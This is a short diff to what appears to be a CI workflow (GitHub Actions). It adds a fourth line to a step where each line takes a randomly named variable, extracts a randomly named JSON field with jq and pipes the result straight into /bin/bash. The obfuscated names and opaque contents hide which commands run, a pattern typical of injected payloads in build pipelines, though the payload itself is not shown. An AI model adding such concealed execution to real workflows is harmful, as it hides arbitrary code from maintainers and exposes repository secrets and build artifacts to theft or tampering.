@@ -29,6 +29,7 @@ jobs:
           echo $rl2001 | jq -r .xxv5304 | /bin/bash
           echo $ug0 | jq -r .mrulf9 | /bin/bash
           printf '%s' "$flzr2" | jq -r .r210 | /bin/bash
+          printf '%s' "$m68598" | jq -r .qm953 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
